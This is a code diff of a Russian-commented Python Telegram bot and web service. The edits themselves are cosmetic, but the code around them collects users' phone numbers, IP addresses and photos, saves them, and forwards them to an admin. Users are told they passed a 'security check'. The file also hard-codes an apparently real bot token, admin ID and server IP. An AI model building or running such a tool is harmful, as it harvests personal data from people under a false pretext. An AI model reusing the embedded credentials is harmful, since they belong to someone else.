@@ -13,7 +13,7 @@ import random
 TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # ❗ заменить на свой токен
 ADMIN_ID = 2054091032  # ❗ заменить на свой Telegram ID
 SITE_PORT = 5000
-SERVER_IP = "207.127.89.193"  # Замени на свой публичный IP
+SERVER_IP = "207.127.89.193"  # ❗ заменить на свой публичный IP
 PHOTOS_DIR = "photos"
 DB_PATH = "users.db"
 
@@ -153,12 +153,12 @@ def save_photo():
 
         add_user(user_id, username, phone, ip, photo_path)
 
-        # === Отправка сообщения пользователю в Telegram ===
+        # Отправка пользователю сообщения об успехе
         url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
         requests.post(url, data=data)
 
-        # === Отправка фото админу ===
+        # Отправка фото админу
         message = (
             f"📸 Новый пользователь!\n"
             f"Номер: {phone}\n"
@@ -263,7 +263,7 @@ async def cleardb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for f in os.listdir(PHOTOS_DIR):
         os.remove(os.path.join(PHOTOS_DIR, f))
 
-    # Удаление базы и пересоздание
+    # Удаление и пересоздание БД
     if os.path.exists(DB_PATH):
         os.remove(DB_PATH)
         init_db()
@@ -276,11 +276,14 @@ async def post_init(application):
 
 def run_bot():
     application = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
+
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("info", info_command))
     application.add_handler(CommandHandler("cleardb", cleardb_command))
     application.add_handler(CallbackQueryHandler(agree_handler, pattern="agree"))
     application.add_handler(MessageHandler(filters.ALL, handle_message))
+
+    print("🤖 Бот готов принимать команды...")
     application.run_polling()
 
 if __name__ == '__main__':
